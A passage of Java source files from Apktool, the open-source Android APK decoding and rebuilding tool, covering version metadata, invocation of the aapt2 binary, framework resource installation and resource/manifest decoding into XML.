 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.meta;

import brut.yaml.*;

public class VersionInfo implements YamlSerializable {
    private Integer mVersionCode;
    private String mVersionName;

    public VersionInfo() {
        clear();
    }

    public void clear() {
        mVersionCode = null;
        mVersionName = null;
    }

    public boolean isEmpty() {
        return mVersionCode == null
            && mVersionName == null;
    }

    @Override
    public void readItem(YamlReader reader) {
        YamlLine line = reader.getLine();
        switch (line.getKey()) {
            case "versionCode":
                mVersionCode = line.getValueInt();
                break;
            case "versionName":
                mVersionName = line.getValue();
                break;
        }
    }

    @Override
    public void write(YamlWriter writer) {
        if (mVersionCode != null) {
            writer.writeInt("versionCode", mVersionCode);
        }
        if (mVersionName != null) {
            writer.writeString("versionName", mVersionName);
        }
    }

    public int getVersionCode() {
        return mVersionCode != null ? mVersionCode : -1;
    }

    public void setVersionCode(int versionCode) {
        mVersionCode = versionCode;
    }

    public String getVersionName() {
        return mVersionName;
    }

    public void setVersionName(String versionName) {
        mVersionName = versionName;
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/AaptInvoker.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res;

import brut.androlib.Config;
import brut.androlib.exceptions.AndrolibException;
import brut.androlib.meta.*;
import brut.androlib.res.Framework;
import brut.common.BrutException;
import brut.common.Log;
import brut.util.OS;

import java.io.File;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;

public class AaptInvoker {
    private static final String TAG = AaptInvoker.class.getName();

    private final ApkInfo mApkInfo;
    private final Config mConfig;

    public AaptInvoker(ApkInfo apkInfo, Config config) {
        mApkInfo = apkInfo;
        mConfig = config;
    }

    public void invoke(File outApk, File manifest, File resDir) throws AndrolibException {
        SdkInfo sdkInfo = mApkInfo.getSdkInfo();
        VersionInfo versionInfo = mApkInfo.getVersionInfo();
        ResourcesInfo resourcesInfo = mApkInfo.getResourcesInfo();

        String aaptPath = mConfig.getAaptBinary();
        if (aaptPath == null || aaptPath.isEmpty()) {
            try {
                aaptPath = AaptManager.getBinaryFile().getPath();
            } catch (AndrolibException ex) {
                aaptPath = AaptManager.getBinaryName();
                Log.w(TAG, aaptPath + ": " + ex.getMessage() + " (defaulting to $PATH binary)");
            }
        }

        List<String> cmd = new ArrayList<>();
        File resZip = null;

        if (resDir != null) {
            resZip = new File(resDir.getParent(), "build/resources.zip");
            OS.rmfile(resZip);

            // Compile the files into flat arsc files.
            cmd.add(aaptPath);
            cmd.add("compile");

            cmd.add("--dir");
            cmd.add(resDir.getPath());

            // Treats error that used to be valid in aapt1 as warnings in aapt2.
            cmd.add("--legacy");

            cmd.add("-o");
            cmd.add(resZip.getPath());

            if (mConfig.isVerbose()) {
                cmd.add("-v");
            }

            if (mConfig.isNoCrunch()) {
                cmd.add("--no-crunch");
            }

            try {
                OS.exec(cmd.toArray(new String[0]));
                Log.d(TAG, "aapt2 compile command ran: " + cmd.toString());
            } catch (BrutException ex) {
                throw new AndrolibException(ex);
            }

            cmd.clear();
        }

        if (manifest == null) {
            return;
        }

        // Link resources to the final apk.
        cmd.add(aaptPath);
        cmd.add("link");

        cmd.add("-o");
        cmd.add(outApk.getPath());

        cmd.add("--manifest");
        cmd.add(manifest.getPath());

        if (sdkInfo.getMinSdkVersion() != null) {
            cmd.add("--min-sdk-version");
            cmd.add(sdkInfo.getMinSdkVersion());
        }
        if (sdkInfo.getTargetSdkVersion() != null) {
            cmd.add("--target-sdk-version");
            cmd.add(sdkInfo.getTargetSdkVersion());
        }
        if (versionInfo.getVersionCode() >= 0) {
            cmd.add("--version-code");
            cmd.add(Integer.toString(versionInfo.getVersionCode()));
        }
        if (versionInfo.getVersionName() != null) {
            cmd.add("--version-name");
            cmd.add(versionInfo.getVersionName());
        }
        if (resourcesInfo.getPackageId() >= 0) {
            int pkgId = resourcesInfo.getPackageId();
            if (pkgId == 0) {
                cmd.add("--shared-lib");
            } else if (pkgId > 1) {
                cmd.add("--package-id");
                cmd.add(Integer.toString(pkgId));
                if (pkgId < 0x7F) {
                    cmd.add("--allow-reserved-package-id");
                }
            }
        }
        if (resourcesInfo.getPackageName() != null) {
            cmd.add("--rename-resources-package");
            cmd.add(resourcesInfo.getPackageName());
        }
        if (resourcesInfo.isSparseEntries()) {
            cmd.add("--enable-sparse-encoding");
        }
        if (resourcesInfo.isCompactEntries()) {
            cmd.add("--enable-compact-entries");
        }
        if (resourcesInfo.isKeepRawValues()) {
            cmd.add("--keep-raw-values");
        }
        if (!mApkInfo.getFeatureFlags().isEmpty()) {
            List<String> featureFlags = new ArrayList<>();
            for (Map.Entry<String, Boolean> entry : mApkInfo.getFeatureFlags().entrySet()) {
                featureFlags.add(entry.getKey() + "=" + entry.getValue());
            }
            cmd.add("--feature-flags");
            cmd.add(String.join(",", featureFlags));
        }

        // Disable automatic changes.
        cmd.add("--no-auto-version");
        cmd.add("--no-version-vectors");
        cmd.add("--no-version-transitions");
        cmd.add("--no-resource-deduping");
        cmd.add("--no-compile-sdk-metadata");

        // #3427 - Ignore stricter parsing during aapt2.
        cmd.add("--warn-manifest-validation");

        for (File includeFile : getIncludeFiles()) {
            cmd.add("-I");
            cmd.add(includeFile.getPath());
        }
        if (mConfig.isVerbose()) {
            cmd.add("-v");
        }
        if (resZip != null) {
            cmd.add(resZip.getPath());
        }

        try {
            OS.exec(cmd.toArray(new String[0]));
            Log.d(TAG, "aapt2 link command ran: " + cmd.toString());
        } catch (BrutException ex) {
            throw new AndrolibException(ex);
        }
    }

    private List<File> getIncludeFiles() throws AndrolibException {
        List<File> files = new ArrayList<>();

        UsesFramework usesFramework = mApkInfo.getUsesFramework();
        List<Integer> frameworkIds = usesFramework.getIds();
        if (!frameworkIds.isEmpty()) {
            Framework framework = new Framework(mConfig);
            String tag = usesFramework.getTag();
            for (Integer id : frameworkIds) {
                files.add(framework.getApkFile(id, tag));
            }
        }

        List<String> usesLibrary = mApkInfo.getUsesLibrary();
        if (!usesLibrary.isEmpty()) {
            String[] libFiles = mConfig.getLibraryFiles();
            for (String name : usesLibrary) {
                File libFile = null;
                if (libFiles != null) {
                    for (String libEntry : libFiles) {
                        String[] parts = libEntry.split(":", 2);
                        if (parts.length == 2 && name.equals(parts[0])) {
                            libFile = new File(parts[1]);
                            break;
                        }
                    }
                }
                if (libFile != null) {
                    files.add(libFile);
                } else {
                    Log.w(TAG, "Shared library was not provided: " + name);
                }
            }
        }

        return files;
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/AaptManager.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res;

import brut.androlib.exceptions.AndrolibException;
import brut.common.BrutException;
import brut.util.Jar;
import brut.util.OS;
import brut.util.OSDetection;

import java.io.File;

public final class AaptManager {

    private AaptManager() {
        // Private constructor for utility class.
    }

    public static String getBinaryName() {
        return "aapt2";
    }

    public static File getBinaryFile() throws AndrolibException {
        String binName = getBinaryName();

        if (!OSDetection.is64Bit()) {
            throw new AndrolibException(binName + " binaries are not available for 32-bit platforms.");
        }

        StringBuilder binPath = new StringBuilder("/prebuilt/");
        if (OSDetection.isUnix()) {
            binPath.append("linux"); // ELF 64-bit LSB executable, x86-64
        } else if (OSDetection.isMacOSX()) {
            binPath.append("macosx"); // fat binary x86_64 + arm64
        } else if (OSDetection.isWindows()) {
            binPath.append("windows"); // x86_64
        } else {
            throw new AndrolibException("Could not identify platform: " + OSDetection.returnOS());
        }
        binPath.append('/');
        binPath.append(binName);
        if (OSDetection.isWindows()) {
            binPath.append(".exe");
        }

        File binFile;
        try {
            binFile = Jar.getResourceAsFile(AaptManager.class, binPath.toString(), binName + "_");
        } catch (BrutException ex) {
            throw new AndrolibException(ex);
        }
        setBinaryExecutable(binFile);
        return binFile;
    }

    private static void setBinaryExecutable(File binFile) throws AndrolibException {
        if (!binFile.isFile() || !binFile.canRead()) {
            throw new AndrolibException("Could not read aapt binary: " + binFile.getPath());
        }
        if (!binFile.setExecutable(true)) {
            throw new AndrolibException("Could not set aapt binary as executable: " + binFile.getPath());
        }
    }

    public static int getBinaryVersion(File binFile) throws AndrolibException {
        setBinaryExecutable(binFile);

        String versionStr = OS.execAndReturn(new String[] { binFile.getPath(), "version" });
        if (versionStr == null) {
            throw new AndrolibException("Could not execute aapt binary at location: " + binFile.getPath());
        }

        return getVersionFromString(versionStr);
    }

    public static int getVersionFromString(String versionStr) throws AndrolibException {
        if (versionStr.startsWith("Android Asset Packaging Tool (aapt) 2:")) {
            return 2;
        }
        if (versionStr.startsWith("Android Asset Packaging Tool (aapt) 2.")) {
            return 2; // Prior to Android SDK 26.0.2
        }
        if (versionStr.startsWith("Android Asset Packaging Tool, v0.")) {
            return 1;
        }
        throw new AndrolibException("Could not identify aapt binary version: " + versionStr);
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/Framework.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res;

import brut.androlib.Config;
import brut.androlib.exceptions.AndrolibException;
import brut.androlib.exceptions.FrameworkNotFoundException;
import brut.androlib.meta.ApkInfo;
import brut.androlib.res.decoder.BinaryResourceParser;
import brut.androlib.res.table.ResTable;
import brut.common.Log;
import brut.util.BrutIO;
import brut.util.OS;
import brut.util.OSDetection;
import org.apache.commons.lang3.tuple.Pair;

import java.io.*;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.*;
import java.util.zip.CRC32;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;
import java.util.zip.ZipOutputStream;

public class Framework {
    private static final String TAG = Framework.class.getName();

    private static final File DEFAULT_DIRECTORY;
    static {
        String userHome = System.getProperty("user.home");
        Path defDir;
        if (OSDetection.isMacOSX()) {
            defDir = Paths.get(userHome, "Library", "apktool", "framework");
        } else if (OSDetection.isWindows()) {
            defDir = Paths.get(userHome, "AppData", "Local", "apktool", "framework");
        } else {
            String xdgDataHome = System.getenv("XDG_DATA_HOME");
            if (xdgDataHome != null) {
                defDir = Paths.get(xdgDataHome, "apktool", "framework");
            } else {
                defDir = Paths.get(userHome, ".local", "share", "apktool", "framework");
            }
        }
        DEFAULT_DIRECTORY = defDir.toFile();
    }

    private final Config mConfig;
    private File mDirectory;

    public Framework(Config config) {
        mConfig = config;
    }

    public void install(File apkFile) throws AndrolibException {
        try (ZipFile zip = new ZipFile(apkFile)) {
            ZipEntry entry = zip.getEntry("resources.arsc");
            if (entry == null) {
                throw new AndrolibException("Could not find resources.arsc in file: " + apkFile);
            }

            byte[] data = BrutIO.readAndClose(zip.getInputStream(entry));
            ResTable table = parseAndPublicizeResources(data);
            int pkgId = table.listPackageGroups().iterator().next().getId();
            File outFile = new File(getDirectory(), pkgId + getApkSuffix());

            try (ZipOutputStream out = new ZipOutputStream(Files.newOutputStream(outFile.toPath()))) {
                out.setMethod(ZipOutputStream.STORED);
                CRC32 crc = new CRC32();
                crc.update(data);
                entry = new ZipEntry("resources.arsc");
                entry.setSize(data.length);
                entry.setMethod(ZipEntry.STORED);
                entry.setCrc(crc.getValue());
                out.putNextEntry(entry);
                out.write(data);
                out.closeEntry();

                // Write fake AndroidManifest.xml file to support original aapt.
                entry = zip.getEntry("AndroidManifest.xml");
                if (entry != null) {
                    byte[] manifest = BrutIO.readAndClose(zip.getInputStream(entry));
                    CRC32 manifestCrc = new CRC32();
                    manifestCrc.update(manifest);
                    entry.setSize(manifest.length);
                    entry.setCompressedSize(-1);
                    entry.setCrc(manifestCrc.getValue());
                    out.putNextEntry(entry);
                    out.write(manifest);
                    out.closeEntry();
                }
            }

            Log.i(TAG, "Framework installed to: " + outFile);
        } catch (IOException ex) {
            throw new AndrolibException(ex);
        }
    }

    private ResTable parseAndPublicizeResources(byte[] data) throws AndrolibException {
        ResTable table = new ResTable(new ApkInfo(), mConfig);
        BinaryResourceParser parser = new BinaryResourceParser(table, true, true);
        parser.enableCollectFlagsOffsets();
        parser.parse(new ByteArrayInputStream(data));

        if (table.getPackageGroupCount() == 0) {
            throw new AndrolibException("No packages in resources.arsc in file.");
        }

        // Publicize all entry specs.
        ByteBuffer buffer = ByteBuffer.wrap(data).order(ByteOrder.LITTLE_ENDIAN);
        for (Pair<Long, Integer> pair : parser.getEntrySpecFlagsOffsets()) {
            int position = pair.getKey().intValue();
            int count = pair.getValue();
            for (int i = 0; i < count; i++, position += 4) {
                int flags = buffer.getInt(position);
                buffer.putInt(position, flags | 0x40000000); // ResTable_typeSpec::SPEC_PUBLIC
            }
        }

        return table;
    }

    public File getDirectory() throws AndrolibException {
        if (mDirectory == null) {
            String path = mConfig.getFrameworkDirectory();
            File dir = (path != null && !path.isEmpty()) ? new File(path) : DEFAULT_DIRECTORY;

            if (dir.exists() && !dir.isDirectory()) {
                throw new AndrolibException("Framework path is not a directory: " + dir);
            }

            File parent = dir.getParentFile();
            if (parent != null && parent.exists() && !parent.isDirectory()) {
                throw new AndrolibException("Framework path's parent is not a directory: " + parent);
            }

            if (!dir.exists() && !dir.mkdirs()) {
                throw new AndrolibException("Could not create framework directory: " + dir);
            }

            mDirectory = dir;
        }

        return mDirectory;
    }

    public File getApkFile(int id) throws AndrolibException {
        return getApkFile(id, mConfig.getFrameworkTag());
    }

    public File getApkFile(int id, String tag) throws AndrolibException {
        File dir = getDirectory();
        File apkFile = new File(dir, id + getApkSuffix(tag));
        if (apkFile.exists()) {
            return apkFile;
        }

        // Fall back to the untagged framework.
        apkFile = new File(dir, id + getApkSuffix(null));
        if (apkFile.exists()) {
            return apkFile;
        }

        // If the default framework is requested but is missing, extract the built-in one.
        if (id == 1) {
            try {
                BrutIO.copyAndClose(getAndroidFrameworkAsStream(), Files.newOutputStream(apkFile.toPath()));
            } catch (IOException ex) {
                throw new AndrolibException(ex);
            }
            return apkFile;
        }

        throw new FrameworkNotFoundException(id);
    }

    private String getApkSuffix() {
        return getApkSuffix(mConfig.getFrameworkTag());
    }

    private static String getApkSuffix(String tag) {
        return ((tag != null && !tag.isEmpty()) ? "-" + tag : "") + ".apk";
    }

    private InputStream getAndroidFrameworkAsStream() {
        return getClass().getResourceAsStream("/prebuilt/android-framework.jar");
    }

    public void cleanDirectory() throws AndrolibException {
        for (File apkFile : listDirectory()) {
            Log.i(TAG, "Removing framework file: " + apkFile.getName());
            OS.rmfile(apkFile);
        }
    }

    public List<File> listDirectory() throws AndrolibException {
        boolean ignoreTag = mConfig.isForced();
        String suffix = ignoreTag ? getApkSuffix(null) : getApkSuffix();
        List<File> apkFiles = new ArrayList<>();

        for (File file : getDirectory().listFiles()) {
            if (file.isFile() && isValidApkName(file.getName(), suffix, ignoreTag)) {
                apkFiles.add(file);
            }
        }

        return apkFiles;
    }

    private static boolean isValidApkName(String fileName, String suffix, boolean ignoreTag) {
        if (!fileName.endsWith(suffix)) {
            return false;
        }
        if (ignoreTag) {
            return true;
        }

        int len = fileName.length() - suffix.length();
        if (len == 0) {
            return false;
        }
        for (int i = 0; i < len; i++) {
            char ch = fileName.charAt(i);
            if (ch < '0' || ch > '9') {
                return false;
            }
        }
        return true;
    }

    public void publicizeResources(File arscFile) throws AndrolibException {
        try {
            byte[] data = Files.readAllBytes(arscFile.toPath());
            parseAndPublicizeResources(data);
            Files.write(arscFile.toPath(), data);
        } catch (IOException ex) {
            throw new AndrolibException(ex);
        }
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/ResDecoder.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res;

import brut.androlib.Config;
import brut.androlib.exceptions.AndrolibException;
import brut.androlib.meta.ApkInfo;
import brut.androlib.meta.ResourcesInfo;
import brut.androlib.meta.SdkInfo;
import brut.androlib.meta.UsesFramework;
import brut.androlib.meta.VersionInfo;
import brut.androlib.res.decoder.*;
import brut.androlib.res.table.*;
import brut.androlib.res.table.value.ResBag;
import brut.androlib.res.table.value.ResFileReference;
import brut.androlib.res.xml.ResXmlUtils;
import brut.androlib.res.xml.ResXmlSerializer;
import brut.androlib.res.xml.ValuesXmlSerializable;
import brut.common.Log;
import brut.directory.Directory;
import brut.directory.DirectoryException;
import brut.directory.FileDirectory;
import com.google.common.collect.Lists;
import org.apache.commons.lang3.tuple.Pair;

import java.io.*;
import java.util.*;

public class ResDecoder {
    private static final String TAG = ResDecoder.class.getName();

    private final ApkInfo mApkInfo;
    private final Config mConfig;
    private final ResTable mTable;
    private final Map<String, String> mResFileMap;

    public ResDecoder(ApkInfo apkInfo, Config config) {
        mApkInfo = apkInfo;
        mConfig = config;
        mTable = new ResTable(apkInfo, config);
        mResFileMap = new HashMap<>();
    }

    public ResTable getTable() {
        return mTable;
    }

    public Map<String, String> getResFileMap() {
        return mResFileMap;
    }

    public void decodeResources(File apkDir) throws AndrolibException {
        if (!mApkInfo.hasResources()) {
            return;
        }

        mTable.load();

        Map<ResFileDecoder.Type, ResStreamDecoder> decoders = new HashMap<>();
        decoders.put(ResFileDecoder.Type.UNKNOWN, new ResRawStreamDecoder());
        decoders.put(ResFileDecoder.Type.PNG_9PATCH, new ResNinePatchStreamDecoder());

        BinaryXmlResourceParser parser = new BinaryXmlResourceParser(
            mTable, mConfig.isIgnoreRawValues(), mConfig.isDecodeResolveLazy());
        ResXmlSerializer serial = new ResXmlSerializer(true);
        decoders.put(ResFileDecoder.Type.BINARY_XML, new ResXmlPullStreamDecoder(parser, serial));

        ResFileDecoder fileDecoder = new ResFileDecoder(decoders);
        Directory inDir, outDir;

        try {
            inDir = mApkInfo.getApkFile().getDirectory();
            outDir = new FileDirectory(apkDir);
        } catch (DirectoryException ex) {
            throw new AndrolibException(ex);
        }

        ResPackage pkg = mTable.getMainPackage();

        Log.i(TAG, "Decoding value resources...");
        for (ResEntry entry : Lists.newArrayList(pkg.getGroup().listEntries())) {
            if (entry.getValue() instanceof ResBag) {
                ((ResBag) entry.getValue()).resolveKeys();
            }
        }

        Log.i(TAG, "Decoding file resources...");
        for (ResEntry entry : Lists.newArrayList(pkg.getGroup().listEntries())) {
            if (entry.getValue() instanceof ResFileReference) {
                fileDecoder.decode(entry, inDir, outDir, mResFileMap);
            }
        }

        // Disable auto-escaping in generated XMLs.
        serial = new ResXmlSerializer(false);

        Log.i(TAG, "Generating values XMLs...");
        generateValuesXmls(pkg, outDir, serial);
        generatePublicXml(pkg, outDir, serial);
        generateStagingXmls(pkg, outDir, serial);
        generateOverlayableXml(pkg, outDir, serial);

        AndrolibException ex = parser.getFirstError();
        if (ex != null) {
            throw ex;
        }
    }

    private void generateValuesXmls(ResPackage pkg, Directory outDir, ResXmlSerializer serial)
            throws AndrolibException {
        // Group entries by type name + qualifiers, ignoring alias duplicates in sub-packages.
        Map<Pair<String, String>, List<ResEntry>> entriesMap = new HashMap<>();
        for (ResEntry entry : pkg.getGroup().listEntries()) {
            if (entry.getValue() instanceof ValuesXmlSerializable && !pkg.isAlias(entry.getResId())) {
                ResType type = entry.getType();
                Pair<String, String> key = Pair.of(type.getName(), type.getConfig().toQualifiers());
                entriesMap.computeIfAbsent(key, t -> new ArrayList<>()).add(entry);
            }
        }

        // Generate a values XML per type name + qualifiers.
        for (Map.Entry<Pair<String, String>, List<ResEntry>> mapEntry : entriesMap.entrySet()) {
            Pair<String, String> key = mapEntry.getKey();
            String typeName = key.getLeft();
            String qualifiers = key.getRight();

            List<ResEntry> entries = mapEntry.getValue();
            entries.sort(Comparator.comparing(ResEntry::getResId));

            String outFileName = "res/values" + qualifiers + "/"
                               + (typeName.endsWith("s") ? typeName : typeName + "s") + ".xml";
            try (OutputStream out = outDir.getFileOutput(outFileName)) {
                serial.setOutput(out, null);
                serial.startDocument(null, null);
                serial.startTag(null, "resources");

                for (ResEntry entry : entries) {
                    // We already verified the value, cast directly.
                    ((ValuesXmlSerializable) entry.getValue()).serializeToValuesXml(serial, entry);
                }

                serial.endTag(null, "resources");
                serial.endDocument();
                serial.flush();
            } catch (DirectoryException | IOException ex) {
                throw new AndrolibException("Could not generate: " + outFileName, ex);
            }
        }
    }

    private void generatePublicXml(ResPackage pkg, Directory outDir, ResXmlSerializer serial)
            throws AndrolibException {
        List<ResEntrySpec> specs = Lists.newArrayList(pkg.listEntrySpecs());
        specs.sort(Comparator.comparing(ResEntrySpec::getResId));

        String outFileName = "res/values/public.xml";
        try (OutputStream out = outDir.getFileOutput(outFileName)) {
            serial.setOutput(out, null);
            serial.startDocument(null, null);
            serial.startTag(null, "resources");

            for (ResEntrySpec spec : specs) {
                serial.startTag(null, "public");
                serial.attribute(null, "type", spec.getTypeSpec().getName());
                serial.attribute(null, "name", spec.getName());
                serial.attribute(null, "id", spec.getResId().toString());
                serial.endTag(null, "public");
            }

            serial.endTag(null, "resources");
            serial.endDocument();
            serial.flush();
        } catch (DirectoryException | IOException ex) {
            throw new AndrolibException("Could not generate: " + outFileName, ex);
        }
    }

    private void generateStagingXmls(ResPackage pkg, Directory outDir, ResXmlSerializer serial)
            throws AndrolibException {
        if (pkg.getGroup().getPackageCount() <= 1) {
            return;
        }

        // Collect and sort all entry specs defined in sub-packages.
        List<ResPackage> subPkgs = Lists.newArrayList(pkg.getGroup().listSubPackages());
        List<ResEntrySpec> subSpecs = new ArrayList<>();
        for (ResPackage subPkg : subPkgs) {
            subSpecs.addAll(subPkg.listEntrySpecs());
        }
        subSpecs.sort(Comparator.comparing(ResEntrySpec::getResId));

        // Separate the entry specs into groups by type.
        Map<ResTypeSpec, List<ResEntrySpec>> stagingGroups = new LinkedHashMap<>();
        Map<ResTypeSpec, List<ResEntrySpec>> finalGroups = new LinkedHashMap<>();
        Map<ResTypeSpec, List<ResEntrySpec>> prevMap = null;
        List<ResEntrySpec> currList = null;
        ResId prevId = null;
        for (ResEntrySpec spec : subSpecs) {
            ResId currId = spec.getResId();
            Map<ResTypeSpec, List<ResEntrySpec>> currMap = pkg.isAlias(currId) ? finalGroups : stagingGroups;

            if (prevId == null || currId.typeId() != prevId.typeId() || currMap != prevMap) {
                currList = new ArrayList<>();
                currMap.put(spec.getTypeSpec(), currList);
                prevMap = currMap;
            }

            currList.add(spec);
            prevId = currId;
        }

        // Generate values XML for the staging groups.
        if (!stagingGroups.isEmpty()) {
            String outFileName = "res/values/public-staging.xml";
            try (OutputStream out = outDir.getFileOutput(outFileName)) {
                serial.setOutput(out, null);
                serial.startDocument(null, null);
                serial.startTag(null, "resources");

                for (Map.Entry<ResTypeSpec, List<ResEntrySpec>> mapEntry : stagingGroups.entrySet()) {
                    ResTypeSpec typeSpec = mapEntry.getKey();
                    ResId firstId = ResId.of(typeSpec.getPackage().getId(), typeSpec.getId(), 0);

                    serial.startTag(null, "staging-public-group");
                    serial.attribute(null, "type", mapEntry.getKey().getName());
                    serial.attribute(null, "first-id", firstId.toString());

                    int lastEntryId = 0;
                    for (ResEntrySpec spec : mapEntry.getValue()) {
                        int entryId = spec.getId();
                        while (lastEntryId++ < entryId) {
                            serial.startTag(null, "public");
                            serial.attribute(null, "name", "removed_");
                            serial.endTag(null, "public");
                        }

                        serial.startTag(null, "public");
                        serial.attribute(null, "name", spec.getName());
                        serial.endTag(null, "public");
                    }

                    serial.endTag(null, "staging-public-group");
                }

                serial.endTag(null, "resources");
                serial.endDocument();
                serial.flush();
            } catch (DirectoryException | IOException ex) {
                throw new AndrolibException("Could not generate: " + outFileName, ex);
            }
        }

        // Generate values XML for the finalized groups.
        if (!finalGroups.isEmpty()) {
            String outFileName = "res/values/public-final.xml";
            try (OutputStream out = outDir.getFileOutput(outFileName)) {
                serial.setOutput(out, null);
                serial.startDocument(null, null);
                serial.startTag(null, "resources");

                for (Map.Entry<ResTypeSpec, List<ResEntrySpec>> mapEntry : finalGroups.entrySet()) {
                    ResTypeSpec typeSpec = mapEntry.getKey();
                    ResId firstId = ResId.of(typeSpec.getPackage().getId(), typeSpec.getId(), 0);

                    serial.startTag(null, "staging-public-group-final");
                    serial.attribute(null, "type", mapEntry.getKey().getName());
                    serial.attribute(null, "first-id", firstId.toString());

                    int lastEntryId = 0;
                    for (ResEntrySpec spec : mapEntry.getValue()) {
                        int entryId = spec.getId();
                        while (lastEntryId++ < entryId) {
                            serial.startTag(null, "public");
                            serial.attribute(null, "name", "removed_");
                            serial.endTag(null, "public");
                        }

                        serial.startTag(null, "public");
                        serial.attribute(null, "name", spec.getName());
                        serial.endTag(null, "public");
                    }

                    serial.endTag(null, "staging-public-group-final");
                }

                serial.endTag(null, "resources");
                serial.endDocument();
                serial.flush();
            } catch (DirectoryException | IOException ex) {
                throw new AndrolibException("Could not generate: " + outFileName, ex);
            }
        }
    }

    private void generateOverlayableXml(ResPackage pkg, Directory outDir, ResXmlSerializer serial)
            throws AndrolibException {
        if (pkg.getOverlayableCount() == 0) {
            return;
        }

        List<ResOverlayable> overlayables = Lists.newArrayList(pkg.listOverlayables());
        overlayables.sort(Comparator.comparing(ResOverlayable::getName));

        String outFileName = "res/values/overlayable.xml";
        try (OutputStream out = outDir.getFileOutput(outFileName)) {
            serial.setOutput(out, null);
            serial.startDocument(null, null);
            serial.startTag(null, "resources");

            for (ResOverlayable overlayable : overlayables) {
                overlayable.serializeToXml(serial);
            }

            serial.endTag(null, "resources");
            serial.endDocument();
            serial.flush();
        } catch (DirectoryException | IOException ex) {
            throw new AndrolibException("Could not generate: " + outFileName, ex);
        }
    }

    public void decodeManifest(File apkDir) throws AndrolibException {
        if (!mApkInfo.hasManifest()) {
            return;
        }

        BinaryXmlResourceParser parser = new BinaryXmlResourceParser(
            mTable, mConfig.isIgnoreRawValues(), mConfig.isDecodeResolveLazy());
        ResXmlSerializer serial = new ResXmlSerializer(true);
        ManifestPullEventHandler handler = new ManifestPullEventHandler(mApkInfo, !mConfig.isAnalysisMode());
        ResXmlPullStreamDecoder decoder = new ResXmlPullStreamDecoder(parser, serial, handler);

        ResPackage pkg = mTable.getMainPackage();

        Directory inDir, outDir;
        try {
            inDir = mApkInfo.getApkFile().getDirectory();
            outDir = new FileDirectory(apkDir);

            Log.i(TAG, "Decoding AndroidManifest.xml with " + (pkg != null ? "resources" : "only framework resources")
                     + "...");

            try (
                InputStream in = inDir.getFileInput("AndroidManifest.xml");
                OutputStream out = outDir.getFileOutput("AndroidManifest.xml")
            ) {
                decoder.decode(in, out);
            }
        } catch (DirectoryException | IOException ex) {
            throw new AndrolibException(ex);
        }

        // Update apk info.
        ResourcesInfo resourcesInfo = mApkInfo.getResourcesInfo();

        // Flag the app if it preserved raw attribute values.
        if (parser.hasRawValues() && !mConfig.isIgnoreRawValues()) {
            resourcesInfo.setKeepRawValues(true);
        }

        if (pkg != null) {
            resourcesInfo.setPackageId(pkg.getId());

            // We temporarily filled packageName in ResourcesInfo with the package from AndroidManifest.xml.
            // Check if actual resources package differs from the manifest package and update packageName,
            // otherwise clear packageName.
            String manifestPackage = resourcesInfo.getPackageName();
            String resourcesPackage = pkg.getName();
            if (resourcesPackage != null && !resourcesPackage.equals(manifestPackage)) {
                resourcesInfo.setPackageName(resourcesPackage);
            } else {
                // Renaming not needed: resources package is null or identical.
                resourcesInfo.setPackageName(null);
            }

            // Resolve sdkInfo from resources.
            SdkInfo sdkInfo = mApkInfo.getSdkInfo();
            if (!sdkInfo.isEmpty()) {
                String minSdkVersion = sdkInfo.getMinSdkVersion();
                if (minSdkVersion != null) {
                    String refValue = ResXmlUtils.pullValueFromIntegers(apkDir, minSdkVersion);
